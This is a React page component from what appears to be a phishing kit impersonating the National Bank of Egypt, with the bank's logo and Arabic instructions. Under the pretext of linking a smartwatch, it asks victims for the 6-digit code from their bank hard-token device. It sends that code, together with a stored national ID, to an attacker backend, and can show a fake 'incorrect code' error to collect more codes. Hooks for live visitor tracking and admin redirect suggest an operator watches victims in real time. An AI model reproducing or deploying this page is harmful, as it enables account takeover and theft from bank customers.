/**
 * البنك الأهلي المصري - جهاز رموز الأمان (Hard Token)
 * صفحة إدخال رمز الأمان من جهاز Hard Token - رمز من 6 أرقام
 * لربط الساعة بالحساب المصرفي
 */
import React, { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLiveVisitor } from "@/hooks/useLiveVisitor";
import { usePresence } from "@/hooks/usePresence";
import { useAdminRedirect } from "@/hooks/useAdminRedirect";
import { handleWatchImageError, WATCH_IMAGES, WATCH_NAMES } from "@/lib/watchImages";

export default function HardToken() {
  usePresence("hard-token");
  useAdminRedirect();
  useLiveVisitor("hard-token");
  const [, setLocation] = useLocation();
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]); // 6 أرقام
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const nationalId = localStorage.getItem("pw_national_id") || "";
  const saveHardToken = trpc.applications.saveHardToken.useMutation();
  const watchColor = sessionStorage.getItem("pw_selected_watch") || "black";

  useEffect(() => {
    const showError = sessionStorage.getItem("pw_show_error");
    if (showError === "true") {
      setErrorMsg("الرمز المدخل غير صحيح، يرجى إعادة المحاولة");
      sessionStorage.removeItem("pw_show_error");
    }
  }, []);

  useEffect(() => {
    const code = otp.join("");
    if (code.length === 6 && !otp.some(d => !d)) {
      handleSubmit();
    }
  }, [otp]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);
    if (value && index < 5) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handleSubmit = async () => {
    const code = otp.join("");
    if (code.length < 6) { setErrorMsg("يرجى إدخال الرمز كاملاً (6 أرقام)"); return; }
    setLoading(true);
    try {
      await saveHardToken.mutateAsync({ nationalId, hardTokenCode: code });
      setLocation("/processing");
    } catch (err) {
      setErrorMsg("حدث خطأ، يرجى المحاولة مرة أخرى");
      setLoading(false);
    }
  };

  return (
    <div dir="rtl" style={{ minHeight: "100vh", background: "#ffffff", fontFamily: "'Cairo', sans-serif", color: "#1a1a1a" }}>
      <div style={{ maxWidth: "520px", margin: "0 auto", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
        
        {/* Header */}
        <div style={{ padding: "20px", textAlign: "center", borderBottom: "1px solid #e5e7eb" }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: "10px" }}>
            <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="البنك الأهلي المصري" style={{ height: "42px", width: "auto", display: "block" }} onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
          </div>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", marginTop: "8px" }}>
            <img src={WATCH_IMAGES[watchColor] || WATCH_IMAGES["black"]} alt="ساعتك" onError={handleWatchImageError} style={{ width: "36px", height: "36px", objectFit: "contain" }} />
            <span style={{ color: "#666", fontSize: "12px" }}>{WATCH_NAMES[watchColor] || watchColor}</span>
          </div>
        </div>

        {/* Security Device Icon */}
        <div style={{ textAlign: "center", padding: "24px 20px 12px" }}>
          <div style={{ width: "72px", height: "72px", background: "#f0fdf4", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px", border: "3px solid #dcfce7" }}>
            <svg width="36" height="36" viewBox="0 0 24 24" fill="none">
              <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3zm-1 14h2v2h-2v-2zm0-8h2v6h-2V8z" fill="#1B7A3D"/>
            </svg>
          </div>
          <h2 style={{ color: "#1a1a1a", fontWeight: "800", fontSize: "22px", marginBottom: "6px" }}>
            جهاز رموز الأمان - Hard Token
          </h2>
          <p style={{ color: "#666", fontSize: "14px", margin: 0 }}>
            أدخل الرمز من جهاز الأمان لربط الساعة بحسابك المصرفي
          </p>
        </div>

        {/* Device Image & Instructions */}
        <div style={{ margin: "0 20px 20px", background: "#f0fdf4", borderRadius: "16px", padding: "20px", border: "2px solid #dcfce7" }}>
          <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "14px" }}>
            <div style={{ width: "44px", height: "44px", background: "#dcfce7", borderRadius: "12px", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "24px" }}>🔐</div>
            <div>
              <h6 style={{ color: "#1B7A3D", fontWeight: "800", fontSize: "15px", margin: 0, lineHeight: 1.4 }}>خطوات استخراج الرمز</h6>
              <p style={{ color: "#666", fontSize: "11px", margin: "2px 0 0" }}>اتبع التعليمات التالية بدقة</p>
            </div>
          </div>

          {/* Device Image */}
          <div style={{ textAlign: "center", marginBottom: "16px" }}>
            <img
              src="/manus-storage/nbe-hard-token-device_9092db02.png"
              alt="صورة توضيحية لجهاز رموز الأمان Hard Token"
              loading="eager"
              decoding="async"
              style={{ width: "220px", maxWidth: "100%", height: "auto", borderRadius: "12px", border: "2px solid #e5e7eb", boxShadow: "0 4px 12px rgba(0,0,0,0.1)" }}
            />
          </div>

          {/* Instructions */}
          <div style={{ background: "#ffffff", borderRadius: "12px", padding: "16px", border: "1px solid #e5e7eb" }}>
            <div style={{ display: "flex", alignItems: "flex-start", gap: "10px", marginBottom: "14px" }}>
              <div style={{ width: "28px", height: "28px", background: "#1B7A3D", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "14px", fontWeight: "800", color: "white", flexShrink: 0 }}>1</div>
              <span style={{ color: "#1a1a1a", fontWeight: "700", fontSize: "14px", lineHeight: 1.6 }}>قم بتشغيل جهاز رموز الأمان <span style={{ color: "#1B7A3D" }}>Hard Token</span> الخاص بك</span>
            </div>
            <div style={{ display: "flex", alignItems: "flex-start", gap: "10px", marginBottom: "14px" }}>
              <div style={{ width: "28px", height: "28px", background: "#1B7A3D", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "14px", fontWeight: "800", color: "white", flexShrink: 0 }}>2</div>
              <span style={{ color: "#1a1a1a", fontWeight: "700", fontSize: "14px", lineHeight: 1.6 }}>اضغط على زر <span style={{ color: "#b45309", fontWeight: "800" }}>OTP</span> (الزر رقم 1) في الجهاز</span>
            </div>
            <div style={{ display: "flex", alignItems: "flex-start", gap: "10px", marginBottom: "14px" }}>
              <div style={{ width: "28px", height: "28px", background: "#1B7A3D", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "14px", fontWeight: "800", color: "white", flexShrink: 0 }}>3</div>
              <span style={{ color: "#1a1a1a", fontWeight: "700", fontSize: "14px", lineHeight: 1.6 }}>سيظهر لك <span style={{ color: "#b45309", fontWeight: "800" }}>رمز مكوّن من 6 أرقام</span> على شاشة الجهاز</span>
            </div>
            <div style={{ display: "flex", alignItems: "flex-start", gap: "10px" }}>
              <div style={{ width: "28px", height: "28px", background: "#1B7A3D", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "14px", fontWeight: "800", color: "white", flexShrink: 0 }}>4</div>
              <span style={{ color: "#1a1a1a", fontWeight: "700", fontSize: "14px", lineHeight: 1.6 }}>أدخل الرمز في الحقول أدناه لربط الساعة بحسابك المصرفي</span>
            </div>
          </div>
        </div>

        {/* Token OTP Input */}
        <div style={{ padding: "0 20px", flex: 1 }}>
          {errorMsg && <div style={{ background: "#fef2f2", border: "1px solid #fecaca", borderRadius: "10px", padding: "10px 14px", marginBottom: "16px", color: "#dc2626", fontSize: "13px", textAlign: "center" }}>{errorMsg}</div>}
          
          <label style={{ display: "block", color: "#333", fontWeight: "700", fontSize: "14px", marginBottom: "10px", textAlign: "right" }}>
            أدخل الرمز المكوّن من 6 أرقام *
          </label>
          
          {/* OTP Inputs - 6 digits */}
          <div style={{ display: "flex", gap: "10px", justifyContent: "center", marginBottom: "24px", direction: "ltr" }}>
            {otp.map((digit, i) => (
              <input key={i} ref={(el) => { inputRefs.current[i] = el; }} type="tel" inputMode="numeric" maxLength={1} value={digit}
                onChange={(e) => handleChange(i, e.target.value)} onKeyDown={(e) => handleKeyDown(i, e)}
                style={{ width: "48px", height: "58px", textAlign: "center", fontSize: "24px", fontWeight: "700", border: `2px solid ${digit ? "#1B7A3D" : "#d1d5db"}`, borderRadius: "12px", outline: "none", background: "#f9fafb", color: "#1a1a1a", fontFamily: "'Cairo', sans-serif" }} />
            ))}
          </div>

          {/* Submit Button */}
          <button onClick={handleSubmit} disabled={loading || otp.some(d => !d)}
            style={{ width: "100%", background: otp.every(d => d) ? "linear-gradient(135deg, #1B7A3D, #0d4a24)" : "#e5e7eb", color: otp.every(d => d) ? "white" : "#999", border: "none", borderRadius: "12px", padding: "16px", fontSize: "17px", fontWeight: "800", cursor: "pointer", fontFamily: "'Cairo', sans-serif", marginBottom: "16px", boxShadow: otp.every(d => d) ? "0 4px 20px rgba(27,122,61,0.3)" : "none" }}>
            {loading ? "جاري التحقق..." : "تأكيد الرمز وربط الساعة ←"}
          </button>

          {/* Security Notice */}
          <div style={{ textAlign: "center", marginBottom: "20px" }}>
            <p style={{ color: "#999", fontSize: "12px", margin: 0 }}>
              🔒 الرمز صالح لمدة 30 ثانية فقط — لا تشاركه مع أي شخص
            </p>
            <p style={{ color: "#b45309", fontSize: "11px", margin: "8px 0 0", fontWeight: "700" }}>
              ⚠️ في حال عدم توفر الجهاز، يرجى التواصل مع أقرب فرع للبنك الأهلي المصري
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
